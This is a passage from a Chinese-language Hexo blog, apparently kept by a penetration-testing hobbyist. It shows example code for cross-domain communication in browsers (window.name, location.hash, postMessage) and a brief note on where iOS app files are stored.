<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    // 1. 给当前的 window.name 设置一个 http://www.laixiangran.cn/a.html 页面想要得到的数据值 </span><br><span class="line">    window.name = &quot;hello world!&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="location-hash-跨域"><a href="#location-hash-跨域" class="headerlink" title="location.hash 跨域"></a>location.hash 跨域</h3><p>location.hash 方式跨域，是子框架具有修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。</p>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&quot;display: none;&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span><br><span class="line">    function test() &#123;</span><br><span class="line">        // 3. 获取通过 http://laixiangran.cn/b.html 页面设置 hash 值</span><br><span class="line">        var data = window.location.hash;</span><br><span class="line">        console.log(data);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    // 1. 设置父页面的 hash 值</span><br><span class="line">    parent.location.hash = &quot;world&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="postMessage-跨域"><a href="#postMessage-跨域" class="headerlink" title="postMessage 跨域"></a>postMessage 跨域</h3><p>window.postMessage(message，targetOrigin) 方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。这个应该就是以后解决 dom 跨域通用方法了。</p>
<p>调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。</p>
<p>需要接收消息的 window 对象，可是通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。</p>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&quot;display: none;&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 1. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span><br><span class="line">    function test() &#123;</span><br><span class="line">        // 2. 获取 http://laixiangran.cn/b.html 页面的 window 对象，</span><br><span class="line">        // 然后通过 postMessage 向 http://laixiangran.cn/b.html 页面发送消息</span><br><span class="line">        var iframe = document.getElementById(&apos;myIframe&apos;);</span><br><span class="line">        var win = iframe.contentWindow;</span><br><span class="line">        win.postMessage(&apos;我是来自 http://www.laixiangran.cn/a.html 页面的消息&apos;, &apos;*&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    // 注册 message 事件用来接收消息</span><br><span class="line">    window.onmessage = function(e) &#123;</span><br><span class="line">        e = e || event; // 获取事件对象</span><br><span class="line">        console.log(e.data); // 通过 data 属性得到发送来的消息</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/12/ios渗透测试/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/12/ios渗透测试/" class="post-title-link" itemprop="url">ios渗透测试</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-12 11:56:02 / 修改时间：14:00:14" itemprop="dateCreated datePublished" datetime="2019-10-12T11:56:02+08:00">2019-10-12</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="IOSapp文件位置"><a href="#IOSapp文件位置" class="headerlink" title="IOSapp文件位置"></a>IOSapp文件位置</h3><p>在/var/mobile（）/Containers/Bundle/Application/文件夹下，根据时间日期判断。</p>
<p>或者ps -elf查看。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">VegyChick</p>
              <div class="site-description motion-element" itemprop="description">沉迷渗透测试的信安菜鸟</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">15</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              

              
            </nav>
          

          

          

          

          

          
          

          
            
          
          

        </div>
      </div>

      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">VegyChick</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.2.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.2.0"></script>

  <script src="/js/motion.js?v=7.2.0"></script>



  
  


  <script src="/js/schemes/muse.js?v=7.2.0"></script>



  

  


  <script src="/js/next-boot.js?v=7.2.0"></script>


  

  

  

  



  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
